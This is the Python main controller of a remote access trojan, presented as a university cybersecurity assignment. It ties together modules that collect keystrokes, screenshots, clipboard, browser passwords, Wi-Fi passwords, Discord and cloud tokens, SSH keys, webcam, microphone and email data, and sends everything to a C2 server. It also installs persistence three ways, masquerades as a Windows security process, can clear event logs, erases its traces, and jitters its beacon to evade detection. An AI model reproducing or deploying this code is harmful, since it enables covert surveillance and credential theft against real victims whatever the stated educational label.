"""
RAT Client - Main Controller
EDUCATIONAL PURPOSE ONLY - RMIT Cybersecurity Assignment

This ties all modules together and communicates with the C2 server.
Kill chain: Execution -> Collection -> Exfiltration

MITRE ATT&CK Techniques (33 total):
  T1082     - System Information Discovery
  T1083     - File and Directory Discovery
  T1005     - Data from Local System
  T1113     - Screen Capture
  T1056.001 - Input Capture: Keylogging
  T1041     - Exfiltration Over C2 Channel
  T1059.006 - Command and Scripting: Python
  T1573.001 - Encrypted Channel: Symmetric Cryptography
  T1547.001 - Boot/Logon Autostart: Registry Run Keys
  T1497.001 - Virtualization/Sandbox Evasion
  T1036     - Masquerading
  T1564.003 - Hide Artifacts: Hidden Window
  T1115     - Clipboard Data
  T1555.003 - Credentials from Web Browsers
  T1059.003 - Command and Scripting: Windows Command Shell
  T1033     - System Owner/User Discovery
  T1552.001 - Unsecured Credentials: Credentials In Files (Wi-Fi passwords, .env files)
  T1528     - Steal Application Access Token (Discord tokens, cloud CLI)
  T1049     - System Network Connections Discovery
  T1018     - Remote System Discovery (ARP table)
  T1016     - System Network Configuration Discovery (DNS cache, routing)
  T1070.004 - Indicator Removal: File Deletion (anti-forensics)
  T1135     - Network Share Discovery (lateral_recon.py)
  T1046     - Network Service Scanning (lateral_recon.py)
  T1070.001 - Indicator Removal: Clear Windows Event Logs (event_log_tamper.py)
  T1125     - Video Capture (webcam_capture.py)
  T1123     - Audio Capture (microphone_capture.py)
  T1053.005 - Scheduled Task/Job (scheduled_task_persist.py)
  T1025     - Data from Removable Media (usb_monitor.py)
  T1614.001 - System Location Discovery (geolocation.py)
  T1055     - Process Injection recon (process_injection_demo.py)
  T1087.003 - Account Discovery: Email Account (email_harvester.py)
  T1114.001 - Email Collection: Local Email (email_harvester.py)
"""

import requests
import time
import threading
import json
import sys
import os
import subprocess
import hashlib
import hmac
import shlex
import random
import glob
import tempfile

# Existing config imports
from config import C2_HOST, C2_PORT, KILL_SWITCH, RAT_NAME

# ===== COMMAND SIGNING KEY (defensive hardening) =====
# Must match COMMAND_SIGNING_KEY on the server. Commands are HMAC-signed so a
# network MitM cannot inject or tamper with remote commands.
COMMAND_SIGNING_KEY = os.environ.get(
    "COMMAND_SIGNING_KEY", "rmit-edu-demo-command-signing-key"
).encode("utf-8")


# Allowlist of safe remote commands. Only prefixes listed here are executed.
# Anything else is refused and reported back as a violation. This replaces the
# previous subprocess.run(..., shell=True) which was an arbitrary RCE sink.
ALLOWED_COMMANDS = {
    "whoami", "hostname", "ipconfig", "systeminfo", "tasklist", "netstat",
    "arp", "route", "dir", "echo", "ver", "ping", "tracert", "nslookup",
}


def verify_command_signature(cmd, signature):
    """Return True if the HMAC-SHA256 of cmd matches the provided signature."""
    if not signature:
        return False
    expected = hmac.new(COMMAND_SIGNING_KEY, cmd.encode("utf-8"), hashlib.sha256).hexdigest()
    return hmac.compare_digest(expected, signature)
from config import COLLECT_SYSTEM_INFO, COLLECT_FILES, COLLECT_SCREENSHOTS, COLLECT_KEYSTROKES
from config import KEYLOG_INTERVAL_SECONDS, SCREENSHOT_INTERVAL_SECONDS

# New config imports
from config import (
    C2_PASSPHRASE, ENCRYPT_COMMS,
    ENABLE_PERSISTENCE, STEALTH_MODE, CHECK_VM,
    COLLECT_CLIPBOARD, COLLECT_BROWSER_DATA, COLLECT_PRIVILEGE_INFO,
    CLIPBOARD_INTERVAL_SECONDS,
    RECONNECT_ENABLED, RECONNECT_BASE_DELAY, RECONNECT_MAX_DELAY, RECONNECT_MAX_ATTEMPTS,
    ENABLE_REMOTE_CMD, CMD_POLL_INTERVAL,
    COLLECT_WIFI_PASSWORDS, COLLECT_TOKENS, COLLECT_NETWORK_RECON,
    BEACON_JITTER, JITTER_PERCENT, ANTI_FORENSICS,
    COLLECT_LATERAL_RECON, COLLECT_EVENT_LOG_INFO, CLEAR_EVENT_LOGS,
    COLLECT_WEBCAM, WEBCAM_INTERVAL_SECONDS, WEBCAM_CAMERA_INDEX,
    COLLECT_MICROPHONE, MICROPHONE_DURATION_SECONDS, MICROPHONE_INTERVAL_SECONDS,
    MICROPHONE_SAMPLE_RATE,
    ENABLE_SCHEDULED_TASK, ENABLE_STARTUP_FOLDER,
    COLLECT_USB_DATA, USB_POLL_INTERVAL,
    COLLECT_GEOLOCATION,
    COLLECT_INJECTION_RECON,
    COLLECT_EMAIL_DATA,
)

# Existing module imports
from system_info import get_system_info
from file_recon import get_file_summary, exfiltrate_file, find_interesting_files
from screenshot import take_screenshot
from keylogger import Keylogger

# New module imports
from crypto_utils import encrypt_payload, decrypt_payload, derive_key
from persistence import install_persistence, check_persistence, remove_persistence
from evasion import detect_virtual_environment, hide_console, masquerade_process
from clipboard_monitor import ClipboardMonitor
from browser_data import extract_browser_passwords, extract_browser_history
from privilege_check import is_admin, get_privilege_info, check_uac_settings, find_escalation_opportunities
from wifi_stealer import get_wifi_passwords, get_wifi_interfaces
from token_harvester import harvest_all as harvest_tokens
from network_recon import full_network_recon
from lateral_recon import full_lateral_recon
from event_log_tamper import full_event_log_recon
from webcam_capture import capture_webcam, list_cameras
from microphone_capture import record_audio, list_audio_devices
from scheduled_task_persist import (
    install_scheduled_task, check_scheduled_task, remove_scheduled_task,
    install_startup_folder_persistence, remove_startup_folder_persistence,
)
from usb_monitor import full_usb_recon, get_removable_drives, scan_usb_drive
from geolocation import full_geolocation_recon
from process_injection_demo import full_injection_recon
from email_harvester import full_email_harvest


C2_URL = f"http://{C2_HOST}:{C2_PORT}"

# Derive AES key from passphrase (only when encryption is enabled)
AES_KEY = derive_key(C2_PASSPHRASE) if ENCRYPT_COMMS else None  # None = plaintext mode


def jittered_sleep(base_seconds, stop_event=None):
    """
    Sleep for a randomized duration around the base value.

    Beacon jitter is how real C2 frameworks (Cobalt Strike, Sliver) evade
    network detection. Without jitter, connections happen at exact intervals
    (e.g., every 60.0s) which makes the std_dev ≈ 0 — trivially detectable.

    With ±30% jitter, a 60s beacon becomes 42-78s, making pattern analysis
    much harder. Our AV's beacon detector uses std_dev < 5s as its threshold.
    """
    if BEACON_JITTER:
        jitter = base_seconds * (JITTER_PERCENT / 100.0)
        actual = base_seconds + random.uniform(-jitter, jitter)
        actual = max(1, actual)  # Never go below 1 second
    else:
        actual = base_seconds

    if stop_event:
        stop_event.wait(actual)
    else:
        time.sleep(actual)


def send_to_c2(endpoint, data):
    """
    Send data to the C2 server.
    If ENCRYPT_COMMS is enabled, encrypts the payload with AES-256-CBC.
    Includes exponential backoff reconnection if RECONNECT_ENABLED.
    """
    delay = RECONNECT_BASE_DELAY
    attempts = 0
    max_attempts = RECONNECT_MAX_ATTEMPTS if RECONNECT_ENABLED else 1

    while attempts < max_attempts:
        try:
            if ENCRYPT_COMMS and AES_KEY:
                # Encrypt payload and send as octet-stream
                encrypted = encrypt_payload(data, AES_KEY)
                resp = requests.post(
                    f"{C2_URL}/{endpoint}",
                    data=encrypted,
                    headers={"Content-Type": "application/octet-stream"},
                    timeout=10
                )
            else:
                # Plaintext JSON (original behavior)
                resp = requests.post(
                    f"{C2_URL}/{endpoint}",
                    json=data,
                    timeout=10
                )
            return resp.status_code == 200

        except requests.ConnectionError:
            attempts += 1
            if not RECONNECT_ENABLED or attempts >= max_attempts:
                print(f"[!] C2 server not reachable at {C2_URL}")
                return False
            print(f"[!] C2 unreachable. Retry {attempts}/{max_attempts} in {delay}s...")
            time.sleep(delay)
            # Exponential backoff with cap
            delay = min(delay * 2, RECONNECT_MAX_DELAY)

        except Exception as e:
            print(f"[!] Error sending to C2: {e}")
            return False

    return False


def check_kill_switch():
    """Check if kill switch is activated on C2."""
    try:
        resp = requests.get(f"{C2_URL}/kill_switch", timeout=5)
        if resp.status_code == 200:
            return resp.json().get("kill", False)
    except Exception:
        pass
    return False


def phase1_system_recon():
    """Phase 1: Gather and send system information."""
    print("[*] Phase 1: System Reconnaissance...")
    info = get_system_info()
    success = send_to_c2("data/system_info", {
        "rat_id": RAT_NAME,
        "data": info
    })
    if success:
        print("[+] System info sent to C2")
    return success


def phase2_file_recon():
    """Phase 2: Map file system and send directory tree."""
    print("[*] Phase 2: File Reconnaissance...")
    summary = get_file_summary()
    success = send_to_c2("data/file_recon", {
        "rat_id": RAT_NAME,
        "data": summary
    })
    if success:
        print(f"[+] File tree sent. Found {len(summary['interesting_files'])} interesting files")

    # Exfiltrate first 10 interesting files
    files = find_interesting_files()[:10]
    for f in files:
        file_data, err = exfiltrate_file(f["path"])
        if file_data:
            send_to_c2("data/file_content", {
                "rat_id": RAT_NAME,
                "data": file_data
            })
            print(f"[+] Exfiltrated: {f['name']}")
        else:
            print(f"[-] Skipped {f['name']}: {err}")

    return success


def phase3_screenshot_loop(stop_event):
    """Phase 3: Periodic screenshot capture."""
    print("[*] Phase 3: Screenshot capture started")
    while not stop_event.is_set():
        data, err = take_screenshot()
        if data:
            send_to_c2("data/screenshot", {
                "rat_id": RAT_NAME,
                "data": data
            })
            print(f"[+] Screenshot sent ({data['width']}x{data['height']})")
        jittered_sleep(SCREENSHOT_INTERVAL_SECONDS, stop_event)


def phase4_keylogger_loop(keylogger, stop_event):
    """Phase 4: Periodic keystroke exfiltration."""
    print("[*] Phase 4: Keylogger active")
    while not stop_event.is_set():
        jittered_sleep(KEYLOG_INTERVAL_SECONDS, stop_event)
        if stop_event.is_set():
            break
        data = keylogger.get_and_clear_buffer()
        if data["keystroke_count"] > 0:
            send_to_c2("data/keystrokes", {
                "rat_id": RAT_NAME,
                "data": data
            })
            print(f"[+] Sent {data['keystroke_count']} keystrokes")


def phase5_clipboard_loop(stop_event):
    """Phase 5: Periodic clipboard capture (T1115)."""
    print("[*] Phase 5: Clipboard monitor started")
    monitor = ClipboardMonitor()
    while not stop_event.is_set():
        result = monitor.capture()
        if result:
            send_to_c2("data/clipboard", {
                "rat_id": RAT_NAME,
                "data": result
            })
            print(f"[+] Clipboard captured ({result['char_count']} chars)")
        jittered_sleep(CLIPBOARD_INTERVAL_SECONDS, stop_event)


def phase6_browser_data():
    """Phase 6: One-time browser credential and history extraction (T1555.003)."""
    print("[*] Phase 6: Browser data extraction...")

    for browser in ["chrome", "edge"]:
        # Extract passwords
        passwords = extract_browser_passwords(browser)
        if passwords:
            send_to_c2("data/browser_passwords", {
                "rat_id": RAT_NAME,
                "data": {"browser": browser, "credentials": passwords}
            })
            print(f"[+] {browser.title()}: {len(passwords)} saved passwords extracted")

        # Extract history
        history = extract_browser_history(browser)
        if history:
            send_to_c2("data/browser_history", {
                "rat_id": RAT_NAME,
                "data": {"browser": browser, "history": history}
            })
            print(f"[+] {browser.title()}: {len(history)} history entries extracted")


def phase7_privilege_recon():
    """Phase 7: One-time privilege reconnaissance (T1033)."""
    print("[*] Phase 7: Privilege reconnaissance...")

    priv_data = {
        "is_admin": is_admin(),
        "privilege_info": get_privilege_info(),
        "uac_settings": check_uac_settings(),
        "escalation_opportunities": find_escalation_opportunities()
    }

    success = send_to_c2("data/privilege_info", {
        "rat_id": RAT_NAME,
        "data": priv_data
    })
    if success:
        admin_str = "ADMIN" if priv_data["is_admin"] else "standard user"
        opp_count = len(priv_data["escalation_opportunities"])
        print(f"[+] Privilege info sent (running as {admin_str}, {opp_count} escalation paths)")


def phase8_command_loop(stop_event):
    """Phase 8: Poll C2 for remote commands and execute (T1059.003)."""
    print("[*] Phase 8: Remote command polling started")
    while not stop_event.is_set():
        jittered_sleep(CMD_POLL_INTERVAL, stop_event)
        if stop_event.is_set():
            break

        try:
            resp = requests.get(f"{C2_URL}/commands/{RAT_NAME}", timeout=5)
            if resp.status_code == 200:
                commands = resp.json().get("commands", [])
                for item in commands:
                    # Accept both plain strings (legacy) and {command, signature}
                    if isinstance(item, dict):
                        cmd = item.get("command", "")
                        sig = item.get("signature", "")
                    else:
                        cmd = item
                        sig = None

                    print(f"[*] Received remote command: {cmd[:50]}...")

                    # (1) Verify integrity signature before execution.
                    if not verify_command_signature(cmd, sig):
                        print("[!] Command signature INVALID - refusing to execute")
                        send_to_c2("data/cmd_result", {
                            "rat_id": RAT_NAME,
                            "data": {
                                "command": cmd,
                                "stdout": "",
                                "stderr": "Command signature verification failed",
                                "return_code": -1,
                            }
                        })
                        continue

                    # (2) Enforce allowlist (replaces shell=True RCE sink).
                    executable = cmd.strip().split()[0].lower() if cmd.strip() else ""
                    if executable not in ALLOWED_COMMANDS:
                        print(f"[!] Command '{executable}' not on allowlist - refused")
                        send_to_c2("data/cmd_result", {
                            "rat_id": RAT_NAME,
                            "data": {
                                "command": cmd,
                                "stdout": "",
                                "stderr": f"Command '{executable}' not allowed by policy",
                                "return_code": -1,
                            }
                        })
                        continue

                    # (3) Execute safely: shlex.split (no shell), argv list.
                    try:
                        argv = shlex.split(cmd)
                        result = subprocess.run(
                            argv,
                            capture_output=True, text=True,
                            timeout=30
                        )
                        output = {
                            "command": cmd,
                            "stdout": result.stdout[:10000],
                            "stderr": result.stderr[:5000],
                            "return_code": result.returncode,
                        }
                    except subprocess.TimeoutExpired:
                        output = {
                            "command": cmd,
                            "stdout": "",
                            "stderr": "Command timed out (30s limit)",
                            "return_code": -1,
                        }
                    except Exception as e:
                        output = {
                            "command": cmd,
                            "stdout": "",
                            "stderr": str(e),
                            "return_code": -1,
                        }

                    send_to_c2("data/cmd_result", {
                        "rat_id": RAT_NAME,
                        "data": output
                    })
                    print(f"[+] Command result sent (rc={output['return_code']})")
        except Exception:
            pass


def phase9_wifi_passwords():
    """Phase 9: Extract saved Wi-Fi passwords (T1552.001)."""
    print("[*] Phase 9: Wi-Fi password extraction...")

    wifi_data = {
        "passwords": get_wifi_passwords(),
        "interface": get_wifi_interfaces(),
    }

    success = send_to_c2("data/wifi_passwords", {
        "rat_id": RAT_NAME,
        "data": wifi_data
    })
    if success:
        pw_count = sum(1 for w in wifi_data["passwords"] if w.get("password"))
        print(f"[+] Wi-Fi passwords sent ({pw_count} with passwords out of {len(wifi_data['passwords'])} profiles)")


def phase10_token_harvest():
    """Phase 10: Harvest Discord tokens, SSH keys, cloud creds, .env files (T1528, T1552.001)."""
    print("[*] Phase 10: Token & secret harvesting...")

    token_data = harvest_tokens()

    success = send_to_c2("data/tokens", {
        "rat_id": RAT_NAME,
        "data": token_data
    })
    if success:
        s = token_data.get("summary", {})
        print(f"[+] Tokens sent: {s.get('discord_tokens_found', 0)} Discord, "
              f"{s.get('ssh_keys_found', 0)} SSH keys, "
              f"{s.get('cloud_cred_files', 0)} cloud creds, "
              f"{s.get('env_files_found', 0)} .env files")


def phase11_network_recon():
    """Phase 11: Network topology mapping (T1049, T1018, T1016)."""
    print("[*] Phase 11: Network reconnaissance...")

    net_data = full_network_recon()

    success = send_to_c2("data/network_recon", {
        "rat_id": RAT_NAME,
        "data": net_data
    })
    if success:
        s = net_data.get("summary", {})
        print(f"[+] Network recon sent: {s.get('devices_on_network', 0)} ARP entries, "
              f"{s.get('active_connections', 0)} connections, "
              f"{s.get('dns_entries', 0)} DNS cache entries, "
              f"{s.get('listening_ports', 0)} listening ports, "
              f"{s.get('shares', 0)} shares")


def phase12_lateral_recon():
    """Phase 12: Lateral movement reconnaissance (T1135, T1046, T1087.002)."""
    print("[*] Phase 12: Lateral movement reconnaissance...")

    lateral_data = full_lateral_recon()

    success = send_to_c2("data/lateral_recon", {
        "rat_id": RAT_NAME,
        "data": lateral_data
    })
    if success:
        s = lateral_data.get("summary", {})
        print(f"[+] Lateral recon sent: {s.get('hosts_scanned', 0)} hosts scanned, "
              f"{s.get('hosts_with_open_ports', 0)} with open ports, "
              f"{s.get('smb_hosts', 0)} SMB hosts, "
              f"{s.get('admin_access_hosts', 0)} with admin share access")
        if s.get("in_domain"):
            print(f"    Domain: {s.get('domain_name', 'N/A')}, "
                  f"{s.get('domain_users_found', 0)} domain users discovered")


def phase13_event_log_recon():
    """Phase 13: Event log enumeration + optional clearing (T1070.001, T1562.002)."""
    print("[*] Phase 13: Event log reconnaissance...")

    log_data = full_event_log_recon(clear_logs=CLEAR_EVENT_LOGS)

    success = send_to_c2("data/event_logs", {
        "rat_id": RAT_NAME,
        "data": log_data
    })
    if success:
        s = log_data.get("summary", {})
        print(f"[+] Event log info sent: {s.get('logs_enumerated', 0)} logs, "
              f"{s.get('total_records', 0)} total records, "
              f"{s.get('total_size_mb', 0)} MB")
        if s.get("logs_cleared", 0) > 0:
            print(f"    [!] {s['logs_cleared']} logs CLEARED")
        if not s.get("is_admin"):
            print(f"    [*] Not admin — log clearing unavailable")


def phase14_webcam_loop(stop_event):
    """Phase 14: Periodic webcam capture (T1125)."""
    print("[*] Phase 14: Webcam capture started")
    while not stop_event.is_set():
        data, err = capture_webcam(WEBCAM_CAMERA_INDEX)
        if data:
            send_to_c2("data/webcam", {
                "rat_id": RAT_NAME,
                "data": data
            })
            print(f"[+] Webcam image sent ({data['width']}x{data['height']})")
        else:
            print(f"[-] Webcam capture failed: {err}")
        jittered_sleep(WEBCAM_INTERVAL_SECONDS, stop_event)


def phase15_microphone_loop(stop_event):
    """Phase 15: Periodic audio recording (T1123)."""
    print("[*] Phase 15: Microphone recording started")
    while not stop_event.is_set():
        data, err = record_audio(
            duration_seconds=MICROPHONE_DURATION_SECONDS,
            sample_rate=MICROPHONE_SAMPLE_RATE,
        )
        if data:
            send_to_c2("data/microphone", {
                "rat_id": RAT_NAME,
                "data": data
            })
            print(f"[+] Audio sent ({data['duration_seconds']}s, {data['size_bytes']} bytes)")
        else:
            print(f"[-] Audio capture failed: {err}")
        jittered_sleep(MICROPHONE_INTERVAL_SECONDS, stop_event)


def phase16_geolocation():
    """Phase 16: IP-based geolocation + locale (T1016, T1614.001)."""
    print("[*] Phase 16: Geolocation reconnaissance...")

    geo_data = full_geolocation_recon()

    success = send_to_c2("data/geolocation", {
        "rat_id": RAT_NAME,
        "data": geo_data
    })
    if success:
        s = geo_data.get("summary", {})
        print(f"[+] Geolocation sent: {s.get('city', '?')}, {s.get('country', '?')} "
              f"(IP: {s.get('public_ip', '?')}, ISP: {s.get('isp', '?')})")


def phase17_usb_recon():
    """Phase 17: USB/removable media scan (T1025)."""
    print("[*] Phase 17: USB/removable media reconnaissance...")

    usb_data = full_usb_recon()

    success = send_to_c2("data/usb_recon", {
        "rat_id": RAT_NAME,
        "data": usb_data
    })
    if success:
        s = usb_data.get("summary", {})
        print(f"[+] USB recon sent: {s.get('drives_found', 0)} removable drives, "
              f"{s.get('total_interesting_files', 0)} interesting files")


def phase18_usb_monitor_loop(stop_event):
    """Phase 18: Continuous USB monitoring for new drives (T1025)."""
    print("[*] Phase 18: USB monitor started")
    known_letters = set()

    # Initial snapshot
    for d in get_removable_drives():
        known_letters.add(d["drive_letter"])

    while not stop_event.is_set():
        jittered_sleep(USB_POLL_INTERVAL, stop_event)
        if stop_event.is_set():
            break

        current_drives = get_removable_drives()
        current_letters = set(d["drive_letter"] for d in current_drives)

        new_letters = current_letters - known_letters
        for d in current_drives:
            if d["drive_letter"] in new_letters:
                print(f"[+] New USB detected: {d['drive_letter']}: ({d['volume_name']})")
                scan = scan_usb_drive(d["path"])
                send_to_c2("data/usb_new_drive", {
                    "rat_id": RAT_NAME,
                    "data": {**d, "scan": scan}
                })

        known_letters = current_letters


def phase19_injection_recon():
    """Phase 19: Process injection reconnaissance (T1055) - READ-ONLY."""
    print("[*] Phase 19: Process injection reconnaissance (read-only)...")

    injection_data = full_injection_recon()

    success = send_to_c2("data/injection_recon", {
        "rat_id": RAT_NAME,
        "data": injection_data
    })
    if success:
        s = injection_data.get("summary", {})
        print(f"[+] Injection recon sent: {s.get('total_targets_found', 0)} targets, "
              f"{s.get('viable_targets', 0)} viable, "
              f"{s.get('techniques_available', 0)} techniques available")


def phase20_email_harvest():
    """Phase 20: Email credential and profile harvesting (T1087.003, T1114.001)."""
    print("[*] Phase 20: Email profile harvesting...")

    email_data = full_email_harvest()

    success = send_to_c2("data/email_harvest", {
        "rat_id": RAT_NAME,
        "data": email_data
    })
    if success:
        s = email_data.get("summary", {})
        print(f"[+] Email harvest sent: {s.get('total_profiles', 0)} profiles "
              f"({s.get('outlook_count', 0)} Outlook, {s.get('thunderbird_count', 0)} Thunderbird, "
              f"{s.get('unique_emails_found', 0)} unique emails)")


def anti_forensics_cleanup():
    """
    Anti-forensics: remove traces of RAT activity (T1070.004).

    Cleans up:
      1. Temp files created by browser data extraction
      2. Persistence artifacts (registry key + AppData copy)
      3. Python bytecode (.pyc) files
      4. Prefetch files (if admin)

    Real APTs always clean up. Leaving artifacts is amateur hour.
    """
    print("[*] Anti-forensics: cleaning up traces...")
    cleaned = []

    # 1. Remove temp database copies from browser extraction
    temp_dir = tempfile.gettempdir()
    for pattern in ["*_login_data_copy.db", "*_history_copy.db"]:
        for f in glob.glob(os.path.join(temp_dir, pattern)):
            try:
                os.remove(f)
                cleaned.append(f"Removed temp DB: {os.path.basename(f)}")
            except Exception:
                pass

    # 2. Remove persistence (all 3 methods)
    try:
        remove_persistence()
        cleaned.append("Removed registry persistence + AppData")
    except Exception:
        pass

    try:
        remove_scheduled_task()
        cleaned.append("Removed scheduled task persistence")
    except Exception:
        pass

    try:
        remove_startup_folder_persistence()
        cleaned.append("Removed startup folder persistence")
    except Exception:
        pass

    # 3. Remove .pyc files in our directory
    script_dir = os.path.dirname(os.path.abspath(__file__))
    pycache = os.path.join(script_dir, "__pycache__")
    if os.path.isdir(pycache):
        try:
            import shutil
            shutil.rmtree(pycache)
            cleaned.append("Removed __pycache__")
        except Exception:
            pass

    # 4. Clear Python-related recent file traces
    for pyc in glob.glob(os.path.join(script_dir, "*.pyc")):
        try:
            os.remove(pyc)
            cleaned.append(f"Removed: {os.path.basename(pyc)}")
        except Exception:
            pass

    for item in cleaned:
        print(f"    [+] {item}")

    return cleaned


def self_destruct():
    """Kill switch activated - clean up and exit (T1070.004)."""
    print("[!] Kill switch activated! Cleaning up...")
    if ANTI_FORENSICS:
        anti_forensics_cleanup()
    print("[*] RAT stopped. Educational demo complete.")
    sys.exit(0)


def main():
    print("=" * 50)
    print("  EDUCATIONAL RAT - RMIT CYBERSECURITY")
    print("  For academic demonstration only")
    print("=" * 50)
    print(f"[*] C2 Server: {C2_URL}")
    print(f"[*] Encryption: {'ENABLED (AES-256-CBC)' if ENCRYPT_COMMS else 'DISABLED'}")
    print(f"[*] Beacon Jitter: {'ENABLED (±' + str(JITTER_PERCENT) + '%)' if BEACON_JITTER else 'DISABLED'}")
    print(f"[*] Anti-Forensics: {'ENABLED' if ANTI_FORENSICS else 'DISABLED'}")

    if C2_HOST == "CHANGE_ME":
        print("[!] ERROR: Set C2_HOST in config.py to your Kali VM IP!")
        print("[!] Run 'ip addr' on Kali to find the IP")
        sys.exit(1)

    # ===== PRE-PHASE: Evasion =====
    if STEALTH_MODE:
        print("[*] Stealth mode: hiding console...")
        hide_console()

    masquerade_process()
    print("[+] Process masqueraded as 'Service Host: Windows Security'")

    if CHECK_VM:
        vm_indicators = detect_virtual_environment()
        if vm_indicators:
            print(f"[!] VM detected ({len(vm_indicators)} indicators):")
            for ind in vm_indicators:
                print(f"    - {ind}")
            print("[*] Continuing anyway (educational demo)...")
        else:
            print("[+] No VM indicators found")

    # Check C2 connectivity
    print("[*] Checking C2 connection...")
    try:
        resp = requests.get(f"{C2_URL}/ping", timeout=5)
        if resp.status_code == 200:
            print("[+] C2 server is online!")
        else:
            print("[!] C2 server responded but with unexpected status")
    except requests.ConnectionError:
        print("[!] Cannot reach C2 server. Is the listener running on Kali?")
        print(f"[!] Make sure server.py is running on {C2_HOST}:{C2_PORT}")
        sys.exit(1)

    # ===== PRE-PHASE: Persistence =====
    if ENABLE_PERSISTENCE:
        status = check_persistence()
        if not status["installed"]:
            print("[*] Installing registry persistence...")
            install_persistence()
        else:
            print("[+] Registry persistence already installed")

    if ENABLE_SCHEDULED_TASK:
        sched_status = check_scheduled_task()
        if not sched_status.get("exists"):
            print("[*] Installing scheduled task persistence...")
            result = install_scheduled_task()
            if result.get("installed"):
                print(f"[+] Scheduled task installed: {result['task_name']}")
            else:
                print(f"[-] Scheduled task failed: {result.get('error', 'unknown')}")
        else:
            print("[+] Scheduled task persistence already installed")

    if ENABLE_STARTUP_FOLDER:
        print("[*] Installing startup folder persistence...")
        result = install_startup_folder_persistence()
        if result.get("installed"):
            print(f"[+] Startup folder persistence installed")
        else:
            print(f"[-] Startup folder failed: {result.get('error', 'unknown')}")

    stop_event = threading.Event()
    threads = []

    try:
        # Phase 1: System info (one-time)
        if COLLECT_SYSTEM_INFO:
            phase1_system_recon()

        # Phase 2: File recon (one-time)
        if COLLECT_FILES:
            phase2_file_recon()

        # Phase 3: Screenshots (continuous)
        if COLLECT_SCREENSHOTS:
            t = threading.Thread(target=phase3_screenshot_loop, args=(stop_event,), daemon=True)
            t.start()
            threads.append(t)

        # Phase 4: Keylogger (continuous)
        keylogger = None
        if COLLECT_KEYSTROKES:
            keylogger = Keylogger()
            keylogger.start()
            t = threading.Thread(target=phase4_keylogger_loop, args=(keylogger, stop_event), daemon=True)
            t.start()
            threads.append(t)

        # Phase 5: Clipboard (continuous)
        if COLLECT_CLIPBOARD:
            t = threading.Thread(target=phase5_clipboard_loop, args=(stop_event,), daemon=True)
            t.start()
            threads.append(t)

        # Phase 6: Browser data (one-time)
        if COLLECT_BROWSER_DATA:
            phase6_browser_data()

        # Phase 7: Privilege recon (one-time)
        if COLLECT_PRIVILEGE_INFO:
            phase7_privilege_recon()

        # Phase 9: Wi-Fi passwords (one-time)
        if COLLECT_WIFI_PASSWORDS:
            phase9_wifi_passwords()

        # Phase 10: Token & secret harvesting (one-time)
        if COLLECT_TOKENS:
            phase10_token_harvest()

        # Phase 11: Network recon (one-time)
        if COLLECT_NETWORK_RECON:
            phase11_network_recon()

        # Phase 12: Lateral movement recon (one-time)
        if COLLECT_LATERAL_RECON:
            phase12_lateral_recon()

        # Phase 13: Event log recon (one-time)
        if COLLECT_EVENT_LOG_INFO:
            phase13_event_log_recon()

        # Phase 16: Geolocation (one-time)
        if COLLECT_GEOLOCATION:
            phase16_geolocation()

        # Phase 17: USB recon (one-time scan)
        if COLLECT_USB_DATA:
            phase17_usb_recon()

        # Phase 19: Process injection recon (one-time, read-only)
        if COLLECT_INJECTION_RECON:
            phase19_injection_recon()

        # Phase 20: Email harvest (one-time)
        if COLLECT_EMAIL_DATA:
            phase20_email_harvest()

        # Phase 14: Webcam capture (continuous)
        if COLLECT_WEBCAM:
            t = threading.Thread(target=phase14_webcam_loop, args=(stop_event,), daemon=True)
            t.start()
            threads.append(t)

        # Phase 15: Microphone recording (continuous)
        if COLLECT_MICROPHONE:
            t = threading.Thread(target=phase15_microphone_loop, args=(stop_event,), daemon=True)
            t.start()
            threads.append(t)

        # Phase 18: USB monitoring (continuous)
        if COLLECT_USB_DATA:
            t = threading.Thread(target=phase18_usb_monitor_loop, args=(stop_event,), daemon=True)
            t.start()
            threads.append(t)

        # Phase 8: Remote command polling (continuous)
        if ENABLE_REMOTE_CMD:
            t = threading.Thread(target=phase8_command_loop, args=(stop_event,), daemon=True)
            t.start()
            threads.append(t)

        # Main loop - check for kill switch
        print("\n[*] RAT is running. Press Ctrl+C to stop.")
        print("[*] Checking C2 for kill switch every 10 seconds...")
        while True:
            if check_kill_switch():
                self_destruct()
            time.sleep(10)

    except KeyboardInterrupt:
        print("\n[*] Ctrl+C received. Shutting down...")
    finally:
        stop_event.set()
        if keylogger:
            keylogger.stop()
        print("[*] RAT stopped. Demo complete.")


if __name__ == "__main__":
    main()
